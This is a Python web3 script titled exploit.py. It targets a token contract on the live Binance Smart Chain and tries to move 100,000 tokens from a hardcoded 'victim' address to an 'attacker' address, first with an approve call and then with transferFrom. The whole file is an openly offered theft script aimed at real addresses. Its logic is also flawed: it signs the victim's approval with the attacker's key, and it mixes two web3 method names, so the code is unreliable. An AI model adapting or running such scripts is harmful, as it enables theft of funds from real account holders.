import sys
from web3 import Web3
import json
from web3.middleware import geth_poa_middleware

# Ensure you have provided the attacker private key as a command line argument
if len(sys.argv) < 2:
    print("Usage: python exploit.py <attacker_private_key>")
    sys.exit(1)

# Command line argument for attacker's private key
attacker_private_key = sys.argv[1]

# Connect to BSC
w3 = Web3(Web3.HTTPProvider("https://bsc-dataseed.binance.org"))
w3.middleware_onion.inject(geth_poa_middleware, layer=0)

# Contract setup
contract_address = "0xc461CE1893895ea6eA3dacFe03dbd14120BFf8ba"
attacker = "0x9701b5f824873560ad5670De0891D8D80F998eBa"
victim = "0xDA5eEeF71CE9892b79b0215E771153f84930A653"

# Set the amount you want to exploit
amount_to_steal = w3.toWei(100000, 'ether')  # Adjust decimals if needed

# Load ABI
with open("C.json") as f:
    abi = json.load(f)

token = w3.eth.contract(address=contract_address, abi=abi)

# Step 1: Victim approves the attacker to spend tokens (approve call)
tx1 = token.functions.approve(attacker, 2**256 - 1).build_transaction({
    "from": victim,
    "nonce": w3.eth.get_transaction_count(victim),
    "gas": 200000,
    "gasPrice": w3.toWei("5", "gwei")
})

# Step 2: Sign the approval transaction (using the attacker's private key)
signed_tx1 = w3.eth.account.sign_transaction(tx1, private_key=attacker_private_key)

# Step 3: Send the approval transaction
tx_hash1 = w3.eth.send_raw_transaction(signed_tx1.rawTransaction)
print("Approval transaction sent! Hash:", tx_hash1.hex())

# Step 4: Attack! Transfer tokens from victim to attacker (after approval)
tx2 = token.functions.transferFrom(victim, attacker, amount_to_steal).build_transaction({
    "from": attacker,
    "nonce": w3.eth.get_transaction_count(attacker),
    "gas": 200000,
    "gasPrice": w3.to_wei("5", "gwei")
})

# Step 5: Sign the transfer transaction (using attacker's private key)
signed_tx2 = w3.eth.account.sign_transaction(tx2, private_key=attacker_private_key)

# Step 6: Send the transfer transaction
tx_hash2 = w3.eth.send_raw_transaction(signed_tx2.rawTransaction)
print("Transfer transaction sent! Hash:", tx_hash2.hex())
